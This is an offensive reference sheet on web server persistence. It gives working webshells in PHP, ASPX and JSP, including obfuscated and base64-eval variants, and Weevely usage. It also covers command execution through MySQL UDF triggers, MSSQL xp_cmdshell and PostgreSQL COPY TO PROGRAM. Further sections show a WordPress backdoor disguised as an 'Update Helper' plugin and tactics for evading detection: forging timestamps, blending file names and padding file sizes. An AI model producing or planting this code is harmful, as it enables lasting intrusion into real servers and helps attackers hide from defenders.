# Web Persistence Reference — T1505.003

## PHP Webshells

**Minimal (one-liner):**
```php
<?php if(isset($_REQUEST['c'])){system($_REQUEST['c']);} ?>
```

**Obfuscated (evades basic string matching):**
```php
<?php $k='c';$f='sys'.'tem';if(isset($_REQUEST[$k])){$f($_REQUEST[$k]);} ?>
```

**Base64-encoded execution:**
```php
<?php eval(base64_decode($_POST['d'])); ?>
```
Usage: `curl -X POST http://target/shell.php -d "d=$(echo 'system("id");' | base64)"`

**Weevely (encrypted channel):**
```bash
weevely generate s3cr3tP4ss /tmp/agent.php
weevely http://target.com/uploads/agent.php s3cr3tP4ss
```

## ASPX Webshells

```aspx
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
<%if(Request["c"]!=null){var p=new Process();
p.StartInfo=new ProcessStartInfo("cmd.exe","/c "+Request["c"])
{RedirectStandardOutput=true,UseShellExecute=false};
p.Start();Response.Write(p.StandardOutput.ReadToEnd());}%>
```

## JSP Webshells

```jsp
<%@ page import="java.io.*" %>
<%if(request.getParameter("c")!=null){
Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l;while((l=br.readLine())!=null){out.println(l);}}%>
```

## Database Persistence

**MySQL — UDF + Trigger:**
```sql
-- Requires FILE privilege and plugin directory write
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/output');
-- Trigger on high-traffic table
CREATE TRIGGER persist_check AFTER INSERT ON sessions
FOR EACH ROW SET @x = sys_exec('/opt/.svc/callback.sh');
```

**MSSQL — xp_cmdshell:**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'C:\ProgramData\update\svc.exe';
```

**PostgreSQL — COPY TO PROGRAM:**
```sql
COPY (SELECT '') TO PROGRAM '/opt/.svc/callback.sh';
-- Or via plpython3u extension:
CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$
  import subprocess; return subprocess.check_output(args[0], shell=True).decode()
$$ LANGUAGE plpython3u;
```

## CMS Backdoors

**WordPress malicious plugin** (`wp-content/plugins/update-helper/update-helper.php`):
```php
<?php
/* Plugin Name: Update Helper
   Description: System maintenance
   Version: 1.0 */
add_action('init', function(){
  if(isset($_GET['x']) && md5($_GET['x'])=='KNOWN_HASH'){system($_GET['cmd']);}
});
```
Activate via WP admin or direct DB: `UPDATE wp_options SET option_value='a:1:{...}' WHERE option_name='active_plugins';`

**Joomla:** Place backdoor in `components/com_content/helpers/helper.php` — loaded on many requests.

## Detection Avoidance

- **File naming:** Match existing patterns — `class-wp-cache.php`, `template-functions.php`
- **Timestamp matching:** `touch -r /var/www/html/wp-config.php /var/www/html/wp-content/plugins/update-helper/update-helper.php`
- **.htaccess IP restriction:**
  ```apache
  RewriteCond %{REMOTE_ADDR} !^ATTACKER_IP$
  RewriteRule ^uploads/shell\.php$ - [F]
  ```
- **Content blending:** Embed shell code within legitimate-looking theme/plugin files
- **Size matching:** Pad file to similar size as surrounding files
